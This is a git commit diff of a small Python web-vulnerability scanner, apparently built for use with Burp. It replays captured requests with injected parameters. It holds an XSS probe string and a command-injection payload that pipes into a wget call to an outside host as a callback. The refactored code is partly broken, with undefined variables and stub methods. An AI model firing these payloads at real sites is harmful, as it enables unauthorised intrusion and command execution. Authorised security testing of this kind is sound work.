8c617825a87af2d110fae25f13ec2b2658ef67c6
rasca1 <635713319@qq.com>
2018-09-07 22:01:58 +0800

    test

--- test.py
+++ test.py
@@ -1,3 +1,8 @@
+'''
+Created on 2018年9月7日
+
+@author: rasca1
+'''
 # coding: utf-8
 '''
 Created on 2018��4��18��
@@ -7,17 +12,21 @@ Created on 2018��4��18��
 import json,re,requests
 
 class test_vul:
-    def __init__(self,payload):
-        self.vul_payload=payload
-        f = open('E:/hack/burp_lib/tmp.json', 'r', encoding='utf-8')
+    def __init__(self):
+        '''burp_plugin'''
+    def start(self,payload):
+        vul_payload=payload
+        f = open('tmp.json', 'r', encoding='utf-8')
         test=re.sub('\'','\"',f.read())
-        self.data=json.loads(test)
-        print(self.data)
+        data=json.loads(test)
+        print(data)
+        '''
         if self.data['body']=='':
             #urllist=self.data['url'].split('?')
             self.get_data(self.vul_payload)
         else:
             self.post_data(self.vul_payload)
+        '''
         f.close()
     def get_data(self,payload):
         urllist=self.data['url'].split('?')
@@ -56,30 +65,41 @@ class test_vul:
             #str=urllist[0] + '?' + params
             self.attack_post(self.data['url'],params)
         
-    def attack_post(self,url,data):
+    def method_post(self,url,data):
         #print(url)
         try:
             kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
             r = requests.post(url,data,headers=kv)
-            if 'xssguimaizi' in r.text:
-                print('#xss:%s---%s'%(url,data))
-                #print(r.text)
+            return r.text
         except:
             pass
-    def attack_get(self,url):
+    def method_get(self,url):
         try:
             kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
             r = requests.get(url,headers=kv)
-            if 'xssguimaizi' in r.text:
-                print('#xss:'+url)
+            return r.text
         except:
             pass
-            #print(r.text)
-    def cmd_injection(self,cmd):
-        print(cmd)
+    def xss_injection(self):
+        '''
+        :payload xss测试参数
+        '''
+        print(payload)
+    def cmd_injection(self,payload):
+        '''
+        :payload 命令注入测试参数
+        '''
+        print(payload)
+    def ssrf_fuzz(self,payload):
+        '''
+        :payload ssrf测试参数
+        '''
+        print(payload)
+        
         
 if '__main__' == __name__:
+    item=test_vul()
     payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
     for i in payload:
-        item=test_vul(i)
+        item.start(i)
     #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')
